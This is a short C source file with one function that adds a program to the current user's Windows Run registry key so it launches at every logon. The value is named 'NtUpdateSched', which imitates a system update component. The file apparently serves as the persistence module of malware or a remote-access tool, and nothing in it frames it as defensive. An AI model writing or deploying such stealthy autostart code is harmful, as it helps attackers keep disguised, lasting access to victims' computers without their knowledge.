

#include "registry.h"

ERR_CODE generateRegKey(char* path, char* arg, LONG access) {
    HKEY hKey;
    char exec[128];

    snprintf(exec, 128, "\"%s\" %s", path, arg);
    size_t len = strlen(exec);

    // now try generate the key using CURRENT_USER targeting the run key
    ERR_CODE res = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, access, &hKey);
    if (res == ERROR_SUCCESS) {
        res = RegSetValueExA(hKey, "NtUpdateSched", 0, REG_SZ, (LPBYTE) exec, len);
        RegCloseKey(hKey);

        if (res == ERROR_SUCCESS) { return ECODE_SUCCESS; }
    }
    return ECODE_FAILURE;
}